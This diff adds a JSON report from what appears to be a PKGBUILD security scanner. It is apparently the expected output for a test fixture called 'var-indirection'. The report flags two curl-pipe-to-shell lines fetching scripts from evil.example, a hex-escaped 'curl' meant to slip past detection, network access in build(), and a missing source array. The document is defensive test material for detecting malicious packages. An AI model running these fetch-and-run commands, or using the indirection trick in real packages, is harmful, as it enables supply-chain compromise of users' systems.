@@ -1,0 +1,100 @@
+{
+  "package_name": "var-indirection",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/var-indirection/PKGBUILD",
+        "line": 17,
+        "column": 5,
+        "snippet": "    $dl -fsSL https://evil.example/stage2.sh | bash    [resolved →     curl -fsSL https://evil.example/stage2.sh | bash]"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl -fsSL https://evil.example/stage2.sh | bash"
+      }
+    },
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/var-indirection/PKGBUILD",
+        "line": 23,
+        "column": 5,
+        "snippet": "    $c -s https://evil.example/p | sh    [resolved →     curl -s https://evil.example/p | sh]"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl -s https://evil.example/p | sh"
+      }
+    },
+    {
+      "id": "OBF-003",
+      "severity": "high",
+      "category": "obfuscation",
+      "title": "Hex-encoded payload",
+      "description": "Hex encoding can hide malicious payloads",
+      "location": {
+        "file": "tests/fixtures/malicious/var-indirection/PKGBUILD",
+        "line": 22,
+        "column": 17,
+        "snippet": "    c=$(printf '\\x63url')"
+      },
+      "recommendation": "Decode and review hex-encoded content",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "\\x63"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/var-indirection/PKGBUILD",
+        "line": 14,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/var-indirection/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/var-indirection/PKGBUILD"
+  ],
+  "timestamp": "2026-06-15T13:48:50.737887192Z",
+  "scan_duration_ms": 6
+}
